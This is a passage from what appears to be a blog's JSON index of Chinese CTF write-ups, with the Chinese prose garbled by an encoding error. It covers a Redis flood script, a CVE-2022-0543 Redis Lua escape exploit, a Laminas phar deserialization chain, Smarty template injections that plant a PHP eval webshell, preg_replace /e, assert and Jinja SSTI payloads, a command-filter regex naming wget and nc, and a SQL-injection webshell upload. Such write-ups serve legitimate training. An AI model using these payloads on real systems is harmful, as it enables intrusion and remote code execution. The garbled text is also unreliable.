20, 3, 18]]img = Image.open(&quot;./image/1.png&quot;)width, height = img.sizecrop_width = width * 6crop_height = height * 6image = Image.new(&#x27;RGB&#x27;, (crop_width, crop_height))# åˆ©ç”¨å¾ªç¯å°†æ‰€æœ‰å›¾ç‰‡æ‹¼æ¥åˆ°åˆ›å»ºçš„æ–°å›¾ç‰‡ä¸Šfor i in range(0,6): for j in range(0,6): name = str(name_list[i][j]) + &quot;.png&quot; s_image = Image.open(&quot;./image/&quot; + name) box2 = (width * j, height * i, width * (j + 1), height * (i + 1)) image.paste(s_image, box2) æ‹¼å®Œåèƒ½å¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ï¼š 158s4vb6rt4pt5r32yd6ht5u656555r6796524vi69r2yd5om6w0 æœ€ååˆ©ç”¨twin-hexè§£ç å­—ç¬¦ä¸²å¾—åˆ°flagã€‚","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"ã€æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›ã€‘èµ›åå¤ç°","slug":"ã€æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›ã€‘èµ›åå¤ç°","date":"2022-03-22T10:16:04.000Z","updated":"2022-03-24T06:22:44.274Z","comments":true,"path":"2022/03/22/ã€æ•°å­—ä¸­å›½åˆ›æ–°å¤§èµ›ã€‘èµ›åå¤ç°/","link":"","permalink":"http://example.com/2022/03/22/%E3%80%90%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E3%80%91%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/","excerpt":"å‰è¨€ ä¸ºä»€ä¹ˆè¯´æ˜¯èµ›åå¤ç°ï¼Œå› ä¸ºå¤§éƒ¨åˆ†éƒ½æ²¡åšå‡ºæ¥ï¼Œtclï¼ˆã€‚","text":"å‰è¨€ ä¸ºä»€ä¹ˆè¯´æ˜¯èµ›åå¤ç°ï¼Œå› ä¸ºå¤§éƒ¨åˆ†éƒ½æ²¡åšå‡ºæ¥ï¼Œtclï¼ˆã€‚ è™ç¬¦èµ›é“Plain Textç»™äº†ä¸€ä¸²base64ï¼Œè§£ç åå¾—åˆ°ï¼š 1dOBRO POVALOWATX NA MAT^, WY DOLVNY PEREWESTI \\TO NA ANGLIJSKIJ QZYK. tWOJ SEKRET SOSTOIT IZ DWUH SLOW. wSE BUKWY STRO^NYE. qBLO^NYJ ARBUZ. vELAEM WAM OTLI^NOGO DNQ. å•¥ç©æ„çœ‹å¾—æˆ‘ä¸€æ„£ä¸€æ„£çš„ï¼Œå„ç§å°è¯•ä¹Ÿæ²¡è¯•å‡ºæ¥ï¼Œç„¶åæˆ‘é˜Ÿå‹æ”¾ç¿»è¯‘è½¯ä»¶é‡Œé¢è¯•äº†è¯•ï¼Œå‘ç°æœ‰çŒ«è…»ï¼Œå‘ç°æ˜¯ä¿„æ–‡ï¼Œå¯¹åº”è½¬åŒ–ï¼š 123Ğ°-aã€Ğ±-bã€Ğ²-vã€Ğ³-gã€Ğ´-dã€Ğµ-jeã€Ñ‘-joã€Ğ¶-zhã€Ğ·-zã€Ğ¸-eã€Ğ¹-jjã€Ğº-kã€Ğ»-lã€Ğ¼-mã€Ğ½-nã€Ğ¾-oã€Ğ¿-pã€Ñ€-rã€Ñ-sã€Ñ‚-tã€‚Ñƒ-uã€Ñ„-fã€Ñ…-khã€Ñ†-cã€Ñ‡-chã€Ñˆ-shã€Ñ‰-schã€ÑŠ-&quot; Ñ‹-y ÑŒ-&#x27;ã€Ñ-ehã€Ñ-juã€Ñ-ja å› æ­¤åŸæ–‡è½¬åŒ–ä¸ºï¼š 123Ğ´ĞĞ‘Ğ Ğ ĞŸĞĞ’ĞĞ›ĞĞ¨ĞĞ¢Ğ¥ ĞĞ ĞœĞĞ¢^,Ğ¨Ğ« Ğ”ĞĞ›Ğ’ĞĞ« ĞŸĞ•Ğ Ğ•Ğ¨Ğ•Ğ¡Ğ¢Ğ˜ ÑĞ¢Ğ ĞĞ ĞĞĞ“Ğ›Ğ˜Ğ™Ğ¡ĞšĞ˜Ğ™Ğ¯Ğ—Ğ«Ğš. Ñ‚Ğ¨ĞĞ™ Ğ¡Ğ•ĞšĞ Ğ•Ğ¢ Ğ¡ĞĞ¡Ğ¢ĞĞ˜Ğ¢ Ğ˜Ğ— Ğ”Ba Ğ¡Ğ›ĞBa. ÑˆĞ¡Ğ• Ğ‘Ğ£ĞšĞ¨Ğ« Ğ¡Ğ¢Ğ Ğ^ĞĞ«Ğ•.ÑĞ‘Ğ›Ğ^ĞĞ«Ğ™ ĞĞ Ğ‘Ğ£Ğ—. Ğ²Ğ•Ğ›ĞĞ•Ğœ Ğ¨ĞĞœ ĞĞ¢Ğ›Ğ˜^ĞĞĞ“Ğ Ğ”ĞĞ¯. æœ€åç¿»è¯‘å¾—åˆ°flagï¼š 123WELCOME TO MATH, YOU SHOULD TRANSFER THIS INTO ENGLISHLANGUAGE. YOUR SECRET IS A TWO WORD. SHSE BUKSHY STROKE.APPLE ^ WATERMELON. WE WILL HAVE A GOOD DAY. Quest-Crashæ‰“å´©rediså°±å¯ä»¥äº†ï¼Œredisè¿æ¥æ•°è¶…è¿‡10000åå°±ä¼šæ— æ³•è¿æ¥ï¼Œä¸€ç›´å‘åŒ…å°±å¯ä»¥äº†ã€‚ ç”¨bpæˆ–å†™expéƒ½å¯ï¼š 1234567891011121314151617181920212223import requestsimport jsonurl = &quot;http://120.76.219.239:25502/sendreq&quot;s = requests.session()headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;for i in range(0,1000000): data0 = &#123; &quot;query&quot;: f&quot;SET \\&quot;&#123;i&#125;\\&quot; \\&quot;&#123;str(i)*10000&#125;\\&quot;&quot;, &#125; data1 = &#123; &quot;query&quot;: f&quot;GET \\&quot;&#123;i&#125;\\&quot;&quot;, &#125; data2 = &#123; &quot;query&quot;: &quot;GETFLAG&quot;, &#125; r0 = s.post(url=url, data=json.dumps(data0), headers=headers) r1 = s.post(url=url, data=json.dumps(data1), headers=headers) r2 = s.post(url=url, data=json.dumps(data2), headers=headers) print(r2.text) Quest-RCEä¸‡ä¸‡æ²¡æƒ³åˆ°miscè¦ç”¨cveæ‰“ï¼Œå®åœ¨éš¾å´©ï¼Œè€Œä¸”æˆ‘å‰ä¸€å¤©è¿˜åˆšåˆšçœ‹è¿‡pç‰›å†™çš„å…³äºè¿™ä¸ªcveçš„æ–‡ç« ï¼Œç»“æœåšçš„æ—¶å€™å°±å¿˜äº†ã€‚ï¼ˆ cve-2022-0543ï¼ŒRedis Lua æ²™ç›’é€ƒé€¸ RCEã€‚åŸç†æ–‡ç« ï¼šCVE-2022-0543 expï¼š 1234567891011121314import requestssession = requests.Session()rawBody = &quot;&#123;\\&quot;query\\&quot;:\\&quot;INFO\\\\neval &#x27;local io_l =package.loadlib(\\\\\\&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\\\\\\&quot;,\\\\\\&quot;luaopen_io\\\\\\&quot;); local io = io_l(); local f = io.popen(\\\\\\&quot;cat /f*\\\\\\&quot;,\\\\\\&quot;r\\\\\\&quot;); local res = f:read(\\\\\\&quot;*a\\\\\\&quot;); f:close(); return res&#x27; 0\\&quot;&#125;&quot;headers = &#123;&quot;Origin&quot;:&quot;http://120.25.155.106:21570&quot;,&quot;Accept&quot;:&quot;*/*&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/99.0.4844.74Safari/537.36&quot;,&quot;Referer&quot;:&quot;http://120.25.155.106:21570/&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Accept-Language&quot;:&quot;zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6&quot;,&quot;Content-Type&quot;:&quot;application/json&quot;&#125;response = session.post(&quot;http://120.25.155.106:25502/sendreq&quot;, data=rawBody,headers=headers)print(&quot;Status code: %i&quot; % response.status_code)print(&quot;Response body: %s&quot; % response.content) otherbabysqlå’Œezphpè¿™ä¸¤é¢˜æš‚æ—¶æ²¡æ—¶é—´æˆ–è€…ç¯å¢ƒåŸå› è¿˜æ²¡æœ‰å¤ç°ï¼Œç­‰ä¹‹åæœ‰æ¡ä»¶äº†å†å¤ç°ã€‚ çº¢æ˜è°·èµ›é“MissingFileå†ä¹Ÿä¸ç›¸ä¿¡å–è¯äº†ï¼Œç›´æ¥stringå°±èƒ½æœå‡ºæ¥â€¦â€¦ æˆ–è€…010è¿›å»æœç´¢å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥ Fan websitewww.zipæºç æ³„éœ²ï¼Œä¸‹è½½ä¸‹æ¥å®¡è®¡ï¼Œå‘ç°æ˜¯laminasç»„ä»¶ï¼Œå¹¶ä¸”æ‰¾åˆ°ä¸‹é¢è¿™æ®µä»£ç ï¼š 12345678910111213public function imgdeleteAction()&#123; $request = $this-&gt;getRequest(); if(isset($request-&gt;getPost()[&#x27;imgpath&#x27;]))&#123; $imgpath = $request-&gt;getPost()[&#x27;imgpath&#x27;]; $base = substr($imgpath,-4,4); if(in_array($base,$this-&gt;white_list))&#123; //ç™½åå• @unlink($imgpath); &#125;else&#123; echo &#x27;Only Img File Can Be Deleted!&#x27;; &#125; &#125;&#125; è¿™ä¸ªåœ°æ–¹é€šè¿‡åˆ é™¤æ–‡ä»¶å¯ä»¥è§¦å‘pharååºåˆ—åŒ–ï¼Œåˆ°æ—¶å€™ä¸“é—¨å†™ç¯‡åšå®¢å…·ä½“å­¦ä¹ pharååºåˆ—åŒ–ã€‚ æ¥ç€å‘ç°æœ‰è¿‡æ»¤ï¼š 123456789if(in_array($base,$this-&gt;white_list))&#123; //ç™½åå•é™åˆ¶ $cont = file_get_contents($data[&quot;image-file&quot;][&quot;tmp_name&quot;]); if (preg_match(&quot;/&lt;\\?|php|HALT\\_COMPILER/i&quot;, $cont )) &#123; die(&quot;Not This&quot;); &#125; if($data[&quot;image-file&quot;][&quot;size&quot;]&lt;3000)&#123; die(&quot;The picture size must be more than 3kb&quot;); &#125; $img_path = realpath(getcwd()).&#x27;/public/img/&#x27;.md5($data[&quot;image-file&quot;][&quot;name&quot;]).$base; ä½¿ç”¨gzipå‹ç¼©ç»•è¿‡å‰é¢çš„è¿‡æ»¤ï¼Œå¤§å°è¿‡æ»¤ä½¿ç”¨$phar-&gt;addFromStringå†™å…¥è¿›è¡Œç»•è¿‡ã€‚æ¥ç€é€šè¿‡ç°æœ‰çš„é“¾å­è¿›è¡Œæ”¹ç¼–ï¼Œå¾—åˆ°expï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051//https://xz.aliyun.com/t/8975&lt;?phpnamespace Laminas\\View\\Resolver&#123; class TemplateMapResolver&#123; protected $map = [&quot;setBody&quot;=&gt;&quot;system&quot;]; &#125;&#125;namespace Laminas\\View\\Renderer&#123; class PhpRenderer&#123; private $__helpers; function __construct()&#123; $this-&gt;__helpers = new \\Laminas\\View\\Resolver\\TemplateMapResolver(); &#125; &#125;&#125;namespace Laminas\\Log\\Writer&#123; abstract class AbstractWriter&#123;&#125; class Mail extends AbstractWriter&#123; protected $eventsToMail = [&quot;cat /flag&quot;]; // cmd cmd cmd protected $subjectPrependText = null; protected $mail; function __construct()&#123; $this-&gt;mail = new \\Laminas\\View\\Renderer\\PhpRenderer(); &#125; &#125;&#125;namespace Laminas\\Log&#123; class Logger&#123; protected $writers; function __construct()&#123; $this-&gt;writers = [new \\Laminas\\Log\\Writer\\Mail()]; &#125; &#125;&#125;namespace&#123; $a = new \\Laminas\\Log\\Logger(); $phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub $o = $a; $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(&quot;test.txt&quot;, str_repeat(&quot;mrl64&quot;,999999));//æ·»åŠ æ–‡ä»¶ï¼Œç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering();&#125;?&gt; è·å–pharæ–‡ä»¶ï¼Œå¦‚æœæŠ¥é”™çš„è¯å¯ä»¥å»php.iniä¸­æ›´æ”¹é…ç½®ï¼š 123[Phar]; http://php.net/phar.readonlyphar.readonly = Off ç„¶åè¿›è¡Œä¸€æ³¢gzipæ‰“åŒ…ï¼Œå°†æ–‡ä»¶åç¼€æ”¹ä¸ºpngåä¸Šä¼ ï¼Œæœ€ååœ¨åˆ é™¤å›¾ç‰‡çš„è·¯ç”±ä¸‹åˆ é™¤å›¾ç‰‡è·å–flagï¼Œpayloadï¼š 1phar://./public/img/xxxxxxx.png Smarty_calculatorä»ç„¶æ˜¯www.zipæºç æ³„éœ²ï¼Œé¦–å…ˆæ˜¯index.phpä¸­å¯¹cookieåˆ¤æ–­ï¼Œå› æ­¤å‘åŒ…æ—¶è¦åœ¨cookieä¸Šæ·»åŠ login=1ã€‚ æ–¹æ³•ä¸€éé¢„æœŸè§£ï¼Œæ¥ç€å®¡Smartyçš„ä»£ç ï¼Œé¦–å…ˆdataä¼ è¿›åè¢«displayæ–¹æ³•å¤„ç†ï¼Œå› ä¸ºåŒ…å«äº†Smarty.class.phpï¼Œå› æ­¤ä»è¿™ä¸ªæ–‡ä»¶è·Ÿè¿›ã€‚å½“æ—¶åšé¢˜çš„æ—¶å€™æ²¡çœ‹å‡ºæ¥é—®é¢˜åœ¨å“ªï¼Œåæ¥å»ç¾¤é‡Œçœ‹äº†çœ‹å‘ç°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªcveï¼šphp æ²™ç®±é€ƒé€¸,PHP Smartyæ¨¡ç‰ˆä»£ç æ³¨å…¥æ¼æ´ï¼ˆCVE-2021-26120Smarty Template Engine Multiple Sandbox Escape PHP Code Injection Vulnerabilities ç„¶åç¾¤é‡Œçš„å¤§ä½¬è¯´mathé‚£ä¸ªåœ°æ–¹å­˜åœ¨evalå‡½æ•°ï¼Œgithubä¸Šä¹Ÿå­˜åœ¨ç›¸å…³æµ‹è¯•æ•°æ®ã€‚ æµ‹è¯•åå‘ç°function.math.phpä¸­å­˜åœ¨æŠ¥é”™ã€‚è¿™ä¸ªcveåœ¨è¿™é¢˜ä¸­å¯ä»¥ç›´æ¥åˆ©ç”¨ï¼Œä¸è¿‡è¦ç»•wafã€‚ å…ˆæ„é€ payloadå†™å…¥webshellï¼Œç„¶åç»•è¿‡å³å¯ï¼Œä¾‹å¦‚å…«è¿›åˆ¶ã€URLç¼–ç é…åˆæ¢è¡Œç»•è¿‡ç­‰ç­‰ï¼š 1data=eval:&#123;$x=&quot;42&quot;&#125;&#123;math equation=&quot;(&quot;file_put_contents&quot;)(&quot;123.php&quot;,&quot;&lt;?php eval($_REQUEST[&#x27;aaa&#x27;]);?&gt;&quot;)&quot;&#125; èšå‰‘è¿æ¥ååˆ©ç”¨æ’ä»¶ç»•è¿‡disable_functionsï¼Œåœ¨æ ¹ç›®å½•è·å–flagã€‚ æˆ–è€…ç›´æ¥æ„é€ å˜é‡æ›¿æ¢ï¼š 12?1=phpinfo();data=eval:&#123;$x = &quot;4&quot;&#125;&#123;$y = &quot;5.5&quot;&#125;&#123;math equation=&quot;`calc` x * y&quot; x=$x y=$y&#125; æ–¹æ³•äºŒå®˜æ–¹wpä¸­çš„æ–¹æ³•ï¼Œé€šè¿‡å¯¹æ¯”å®˜æ–¹æºç çš„åŒºåˆ«æ‰¾åˆ°æ­£åˆ™ï¼Œå¹¶ä¸”å®˜æ–¹çš„CHANGELOG.mdä¸­æåˆ°äº†å®‰å…¨é—®é¢˜ï¼š 1&#123;function name=&#x27;blah&#x27;&#125;&#123;/function&#125; é€šè¿‡æ¢è¡Œç»•è¿‡æ­£åˆ™è¯»å–phpinfoï¼Œå‘ç°open_basedirä»¥åŠdisable_functionsï¼Œè¿™é‡Œå°±å¯ä»¥å†™webshellæˆ–è€…é€šè¿‡ini_seté…åˆ chdirçš„trickæ¥ç»•è¿‡open_basedirè¯»å–flagï¼š 12?1=phpinfo();data=%7Bfunction%20name%3D&#x27;exp()%7B%7D%3Beval(%24_GET%5B1%5D)%3Bfunction%0A%0A&#x27;%7D%7B%2Ffunction%7D easy_yatask.py: 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import *import osfrom flag import flagdef gen(): e = 3 while True: try: p = getPrime(512) q = getPrime(512) n = p*q phi = (p-1)*(q-1) d = inverse(e,phi) return p,q,d,n,e except: continue returnp,q,d,n,e = gen()r = getPrime(512)m = bytes_to_long(flag+os.urandom(32))M = m%rc = pow(m,e,n)print(&quot;r = %d&quot;%r)print(&quot;M = %d&quot;%M)print(&quot;n = %d&quot;%n)print(&quot;e = %d&quot;%e)print(&quot;c = %d&quot;%c)&#x27;&#x27;&#x27;r = 7996728164495259362822258548434922741290100998149465194487628664864256950051236186227986990712837371289585870678059397413537714250530572338774305952904473M = 4159518144549137412048572485195536187606187833861349516326031843059872501654790226936115271091120509781872925030241137272462161485445491493686121954785558n = 131552964273731742744001439326470035414270864348139594004117959631286500198956302913377947920677525319260242121507196043323292374736595943942956194902814842206268870941485429339132421676367167621812260482624743821671183297023718573293452354284932348802548838847981916748951828826237112194142035380559020560287e = 3c = 46794664006708417132147941918719938365671485176293172014575392203162005813544444720181151046818648417346292288656741056411780813044749520725718927535262618317679844671500204720286218754536643881483749892207516758305694529993542296670281548111692443639662220578293714396224325591697834572209746048616144307282&#x27;&#x27;&#x27; è¿™é¢˜çš„æœ¬è´¨æ˜¯eä½æŒ‡æ•°ï¼Œä½†æ˜¯ä¸èƒ½ç”¨ä¹‹å‰ç”¨çš„å¸¸è§„è„šæœ¬ï¼Œå› ä¸ºä¼°è®¡è¿™ä¸ªeä¸æ˜¯æ•´æ•°ï¼Œéœ€è¦ä½¿ç”¨åˆ°coppersmithçš„æ±‚æ ¹æ–¹æ³•å¯¹ç³»æ•°è¿›è¡Œçˆ†ç ´ï¼Œexpï¼š 123456789101112131415161718//sagefrom Crypto.Util.number import *r = 7996728164495259362822258548434922741290100998149465194487628664864256950051236186227986990712837371289585870678059397413537714250530572338774305952904473M = 4159518144549137412048572485195536187606187833861349516326031843059872501654790226936115271091120509781872925030241137272462161485445491493686121954785558n = 131552964273731742744001439326470035414270864348139594004117959631286500198956302913377947920677525319260242121507196043323292374736595943942956194902814842206268870941485429339132421676367167621812260482624743821671183297023718573293452354284932348802548838847981916748951828826237112194142035380559020560287e = 3c = 46794664006708417132147941918719938365671485176293172014575392203162005813544444720181151046818648417346292288656741056411780813044749520725718927535262618317679844671500204720286218754536643881483749892207516758305694529993542296670281548111692443639662220578293714396224325591697834572209746048616144307282kbits = 100m0 = MPR.&lt;x&gt; = PolynomialRing(Zmod(n))f = ((M + x*r)^e) - cf = f.monic()x0 = f.small_roots(X=2^kbits,beta=1)[0]print(x0)m = M + x0*rprint(long_to_bytes(m)) è¿è¡Œå¾—å‡ºflagã€‚","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf -web","slug":"ctf-web","permalink":"http://example.com/tags/ctf-web/"}]},{"title":"æ”»é˜²ä¸–ç•Œ2","slug":"æ”»é˜²ä¸–ç•Œ2","date":"2022-03-18T11:51:31.000Z","updated":"2022-03-18T13:35:55.445Z","comments":true,"path":"2022/03/18/æ”»é˜²ä¸–ç•Œ2/","link":"","permalink":"http://example.com/2022/03/18/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C2/","excerpt":"å‰è¨€ æ˜å¤©æ‰“è™ç¬¦äº†ï¼Œå¥½ä¹…æ²¡æ‰“æ”»é˜²ä¸–ç•Œçš„é¢˜äº†ï¼Œå›æ¥ç»ƒç»ƒæ‰‹ï¼Œé¡ºä¾¿è®°å½•ä¸‹ä¸€äº›æœ‰æ„æ€çš„æ²¡åšè¿‡çš„é¢˜ã€‚","text":"å‰è¨€ æ˜å¤©æ‰“è™ç¬¦äº†ï¼Œå¥½ä¹…æ²¡æ‰“æ”»é˜²ä¸–ç•Œçš„é¢˜äº†ï¼Œå›æ¥ç»ƒç»ƒæ‰‹ï¼Œé¡ºä¾¿è®°å½•ä¸‹ä¸€äº›æœ‰æ„æ€çš„æ²¡åšè¿‡çš„é¢˜ã€‚ favorite_numberæŸ¥çœ‹ä»£ç ï¼š 1234567891011121314151617 &lt;?php//php5.5.9$stuff = $_POST[&quot;stuff&quot;];$array = [&#x27;admin&#x27;, &#x27;user&#x27;];if($stuff === $array &amp;&amp; $stuff[0] != &#x27;admin&#x27;) &#123; $num= $_POST[&quot;num&quot;]; if (preg_match(&quot;/^\\d+$/im&quot;,$num))&#123; if (!preg_match(&quot;/sh|wget|nc|python|php|perl|\\?|flag|&#125;|cat|echo|\\*|\\^|\\]|\\\\\\\\|&#x27;|\\&quot;|\\|/i&quot;,$num))&#123; echo &quot;my favorite num is:&quot;; system(&quot;echo &quot;.$num); &#125;else&#123; echo &#x27;Bonjour!&#x27;; &#125; &#125;&#125; else &#123; highlight_file(__FILE__);&#125; çœ‹ä¸Šå»å¾ˆç®€å•ï¼Œç¬¬ä¸€ä¸ªåœ°æ–¹çš„ç»•è¿‡åˆ©ç”¨php5çš„æ•°ç»„æº¢å‡ºæ¼æ´ç»•è¿‡ã€‚æ¥ç€ç¬¬äºŒä¸ªåœ°æ–¹ï¼Œnumä½¿ç”¨%0aç»•è¿‡åŒ¹é…ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°flagè¢«è¿‡æ»¤äº†ï¼Œè€Œä¸”é€šé…ç¬¦ä¹ŸåŸºæœ¬å…¨å†›è¦†æ²¡ã€‚è¿™é‡Œç”¨åˆ°çš„æ˜¯inodeç´¢å¼•èŠ‚ç‚¹æ³•ã€‚ payloadï¼š 1stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=123%0Als -i / æŸ¥è¯¢åˆ°flagçš„èŠ‚ç‚¹ä¸º1704622ï¼Œè·å–æ–‡ä»¶ï¼š 1stuff[4294967296]=admin&amp;stuff[1]=user&amp;num=123%0Atac `find / -inum 1704622` isc-05å·¥æ§é¢˜ï¼Œå…ˆåœ¨é¦–é¡µä¹±ç‚¹ä¸€éï¼Œå‘ç°å°±ä¸€ä¸ªåœ°æ–¹èƒ½è¿›ï¼Œè¿›å»åæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°?pageï¼ŒçŒœæµ‹å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼š 1?page=php://filter/convert.base64-encode/resource=index.php è¯»å–åˆ°æºç ï¼Œè¿™é‡Œæ”¾é‡è¦éƒ¨åˆ†ï¼š 1234567891011121314151617//æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•if ($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123; echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123; preg_replace($pattern, $replacement, $subject); &#125;else&#123; die(); &#125;&#125; ä¹ä¸€çœ‹è¿™é‡Œå®Œå…¨æ²¡æœ‰rceçš„ç‚¹ï¼Œå…¶å®è¿™é‡Œè¦åˆ©ç”¨åˆ°preg_replace()åœ¨/eæ¨¡å¼ä¸‹ä¼šå°†æ›¿æ¢åçš„è¯­å¥ä½œä¸ºphpè¯­å¥æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬æ„å»ºpayloadï¼š 1?pat=/a/e&amp;rep=system(&#x27;cat /flag&#x27;)&amp;sub=a mfwè¿›ç½‘é¡µéšä¾¿ç‚¹ç‚¹å‘ç°?page=ï¼Œå°è¯•ä¼ªåŠ å¯†å±…ç„¶æ²¡ç”¨ï¼Œç„¶åç¿»å®¡æŸ¥å…ƒç´ å‘ç°è®©æˆ‘ä»¬è¾“å…¥flagï¼Œä½†æ˜¯è¾“å…¥åæ˜¯ç©ºçš„ã€‚è¿™é‡Œä¿¡æ¯æœé›†å‘ç°gitæ³„éœ²ï¼Œè·å–åˆ°index.phpï¼Œå®¡è®¡ä»£ç ï¼š 1234567891011121314151617&lt;?phpif (isset($_GET[&#x27;page&#x27;])) &#123; $page = $_GET[&#x27;page&#x27;];&#125; else &#123; $page = &quot;home&quot;;&#125;$file = &quot;templates/&quot; . $page . &quot;.php&quot;;// I heard &#x27;..&#x27; is dangerous!assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);// TODO: Make this look niceassert(&quot;file_exists(&#x27;$file&#x27;)&quot;) or die(&quot;That file doesn&#x27;t exist!&quot;);?&gt; è¿™é‡Œæˆ‘ä»¬ç›´æ¥é—­åˆè¯­å¥ï¼Œç„¶åæ ¹æ®ä»£ç ä¸­flag.phpçš„ä½ç½®æ’å…¥rceï¼Œæœ€åæ¥æ³¨é‡Šå°±å¯ä»¥äº†ï¼š 1?page=mrl64&#x27;) or system(&#x27;cat templates/flag.php&#x27;);// Confusion1å®¡æŸ¥å…ƒç´ å‘ç°æç¤º/containerï¼Œè¿›å…¥åå‘ç°ï¼š 12&lt;!--Flag @ /opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt--&gt;&lt;!--Salt @ /opt/salt_b420e8cfb8862548e68459ae1d37a1d5.txt--&gt; ä½†å°è¯•ç›´æ¥è®¿é—®Flagæ–‡ä»¶ä¸Saltæ–‡ä»¶éƒ½å¤±è´¥äº†ï¼Œåæ¥è¯•äº†åŠå¤©å‘ç°åœ¨/register.phpå‘ç°äº†pythonçš„sstiï¼Œéº»äº†è¿™å°±æ˜¯è›‡åè±¡çš„å«ä¹‰å—ã€‚ å°è¯•å‘ç°classçš„å­—ç¬¦è¢«è¿‡æ»¤ï¼Œä½†æ˜¯requestè¿˜åœ¨ï¼Œå› æ­¤ç”¨requestè§£å†³å°±å¯ä»¥äº†ï¼Œæœ€ç»ˆpayloadï¼š 1register.php/&#123;&#123;&#x27;&#x27;[request.args.a][request.args.b][2][request.args.c]()[40](&#x27;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#x27;)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read filemanagerä¿¡æ¯æœé›†å‘ç°/www.tar.gzæ³„éœ²ï¼Œå®¡æŸ¥ä¸€å †ä»£ç ï¼Œå‘ç°å®Œå…¨æ²¡æœ‰æ³¨å…¥ç©ºé—´ï¼Œå„ç§è½¬ä¹‰ç™½åå•ï¼Œä½†å…¶ä¸­è¯¥æ–‡ä»¶åçš„ä»£ç ä¸­å­˜åœ¨è¿™æ ·ä¸€æ¡è¯­å¥ï¼š 1$re = $db-&gt;query(&quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;); è¿™è¯­å¥å¤šåƒäºŒæ¬¡æ³¨å…¥å•Šã€‚æˆ‘ä»¬å®¡æŸ¥æ–‡ä»¶æ˜¯æ³¨æ„åˆ°extensionæ˜¯ç™½åå•ï¼Œå› æ­¤æˆ‘ä»¬é¦–å…ˆè¦ç½®ç©ºç™½åå•ã€‚æˆ‘ä»¬é¦–å…ˆä¸Šä¼ ä¸€ä¸ªç©ºæ–‡ä»¶ï¼Œå‘½åä¸º&#39;,extension=&#39;.pngï¼Œæ¥ç€æ›´æ”¹æ–‡ä»¶åä¸ºshell.pngã€‚æˆ‘ä»¬å‘ç°ç°åœ¨è¿™ä¸ªæ–‡ä»¶åå­—å˜æˆäº†shell.png.pngï¼Œä¸”sqlè¯­å¥ç°åœ¨å¦‚ä¸‹ï¼š 1update `file` set `filename`=&#x27;upload.png&#x27;, `oldname`=&#x27;&#x27;,extension=&#x27;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot; è¿™é‡Œå°±ç›¸å½“äºç™½åå•ç½®ç©ºäº†ã€‚æ¥ç€æˆ‘ä»¬ä¸Šä¼ å¸¦æœ‰ä¸€å¥é©¬çš„shell.pngæ–‡ä»¶ï¼Œç„¶åæŠŠshell.pngæ”¹åä¸ºshell.phpï¼Œèšå‰‘é“¾æ¥å³å¯ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"unctfç»ƒä¹ 2","slug":"unctfç»ƒä¹ 2","date":"2022-03-16T13:27:23.000Z","updated":"2022-03-17T09:38:22.387Z","comments":true,"path":"2022/03/16/unctfç»ƒä¹ 2/","link":"","permalink":"http://example.com/2022/03/16/unctf%E7%BB%83%E4%B9%A02/","excerpt":"å‰è¨€ ç»§ç»­åˆ·ï¼Œè¿˜æœ‰ä¸€äº›webæ²¡è§£å†³","text":"å‰è¨€ 